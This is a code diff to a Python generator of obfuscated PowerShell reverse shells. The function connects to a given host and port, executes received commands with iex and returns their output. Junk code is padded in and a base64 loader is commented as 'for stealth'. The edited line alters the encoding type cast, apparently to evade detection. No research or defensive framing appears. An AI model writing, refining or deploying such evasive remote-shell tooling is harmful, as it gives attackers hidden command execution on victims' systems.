@@ -50,7 +50,7 @@ def generate_obfuscated_ps(host="localhost", port=1443, write_file=True):
         f"${var['stream']} = ${{{var['tcpclient']}}}.GetStream()\n"
         f"${var['bytes']} = 0..65535|%{{0}}\n"
         f"while((${{var['i']}} = ${{{var['stream']}}}.Read(${{{var['bytes']}}},0,${{{var['bytes']}}}.Length)) -ne 0){{\n"
-        f"    ${{var['data']}} = (New-Object -TypeName {asciiencoding_str}).GetString(${{{var['bytes']}}},0,${{{var['i']}}})\n"
+        f"    ${{var['data']}} = (New-Object -TypeName ([string]{asciiencoding_str})).GetString(${{{var['bytes']}}},0,${{{var['i']}}})\n"
         f"    ${{var['sendback']}} = (iex ${{{var['data']}}} 2>&1 | Out-String)\n"
         f"    ${{var['sendback2']}} = ${{{var['sendback']}}} + \"PS \" + (pwd).Path + \"> \"\n"
         f"    ${{var['sendbyte']}} = ([Text.Encoding]::ASCII).GetBytes(${{{var['sendback2']}}})\n"
@@ -59,6 +59,7 @@ def generate_obfuscated_ps(host="localhost", port=1443, write_file=True):
         "}\n" +
         junk_code()
     )
+
 
 
     # --- Loader: Uses base64 for stealth, minimal obfuscation here ---
